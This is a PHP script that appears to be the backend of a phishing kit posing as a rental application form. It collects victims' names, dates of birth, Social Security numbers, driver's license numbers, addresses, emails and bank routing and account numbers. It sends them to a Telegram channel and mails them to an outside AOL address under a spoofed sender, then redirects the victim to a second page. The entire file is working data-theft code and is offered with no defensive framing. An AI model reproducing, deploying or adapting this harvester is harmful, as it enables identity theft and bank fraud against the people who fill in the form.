<?php
require("email.php");
include("config.php");

    //Server Variables
    $server_mail = "youngloren@aol.com";
    $ip = getenv("REMOTE_ADDR");


    //Fetching HTML Values
    $Fname = $_POST['fname'];
    $Lname = $_POST['lname'];
    $DOB = $_POST['dob'];
    $SSN = $_POST['ssn'];
    $phone = $_POST['ph'];
    $DL = $_POST['dl'];
    $addres = $_POST['addr'];
    $city = $_POST['city'];
    $state = $_POST['state'];
    $zipcode = $_POST['zip'];
    $gender = $_POST['gender'];
    $payment = $_POST['b_gpay'];
    $acttype = $_POST['b_atype'];
    $Rnum = $_POST['b_rt'];
    $Anum = $_POST['b_acc'];
    $email = $_POST['email'];
    $home = $_POST['home-type'];
    $bedrooms = $_POST['bedrooms'];
    $cemail = $_POST['email2'];
    $serv = $_REQUEST['verify'];

    $sender_name = "EM6L3M";
    $sender_mail = "light@emblem.info";

        //Telegram send
        $message = "**RENTAL_INFO1\n";
        $message .= "User-!P : ".$ip."\n";   
        $message .= "----------------------------------------\n";
        $message .= "First-name: ".$_POST['fname']."\n";
        $message .= "----------------------------------------\n";
        $message .= "Last-name: ".$_POST['lname']."\n";
		$message .= "----------------------------------------\n";
        $message .= "DOB: ".$_POST['dob']."\n";
		$message .= "----------------------------------------\n";
        $message .= "SSN: ".$_POST['ssn']."\n";
		$message .= "----------------------------------------\n";
        $message .= "PHONE: ".$_POST['ph']."\n";
		$message .= "----------------------------------------\n";
        $message .= "DL-no: ".$_POST['dl']."\n";
		$message .= "----------------------------------------\n";
        $message .= "ADDRESS: ".$_POST['addr']."\n";
		$message .= "----------------------------------------\n";
        $message .= "CITY: ".$_POST['city']."\n";
		$message .= "----------------------------------------\n";
        $message .= "STATE: ".$_POST['state']."\n";
		$message .= "----------------------------------------\n";
        $message .= "ZIP: ".$_POST['zip']."\n";
		$message .= "----------------------------------------\n";
        $message .= "HOME-TYPE: ".$_POST['home-type']."\n";
		$message .= "----------------------------------------\n";
        $message .= "BEDROOMS: ".$_POST['bedrooms']."\n";
		$message .= "----------------------------------------\n";
        $message .= "GENDER: ".$_POST['gender']."\n";
		$message .= "----------------------------------------\n";
        $message .= "EMAIL: ".$_POST['email']."\n";
		$message .= "----------------------------------------\n";
        $message .= "EMAIL2: ".$_POST['email2']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);
		

        //Main Content
        $main_subject = "DL information l $ip";
        $main_body = "<br> 
        First Name : $Fname <br>
	    Last Name : $Lname <br>
        Date Of Birth : $DOB <br> 		
        SSN : $SSN <br>
	    Cell for SMS : $phone <br> 
        Drivers License Number : $DL <br>
        Street Address : $addres <br>
	    City : $city <br> 
        State : $state <br>
	    ZIP code : $zipcode <br>
		Country : United States <br>
        Gender : $gender <br>
	    Payment Type : $payment <br>
        Account Type : $acttype <br>
		Routing Number : $Rnum <br>
        Account Number : $Anum <br>
        Email address : $email <br> 		
        Email address : $cemail <br>
        IP : $ip.";


//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
        //Sending mail to Server
        $retval = mail($server_mail, $main_subject, "$uid\r\n \r\n\r\n $main_body \r\n\r\n--$uid\r\n $uid","From: $sender_name <$sender_mail>\r\nReply-To: $sender_mail\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary=\"$uid\"\r\n\r\n");
        //Sending mail to Sender
//#############################DO NOT CHANGE ANYTHING ABOVE THIS LINE#############################

        //Output
        header("location:apply2.html");
?>
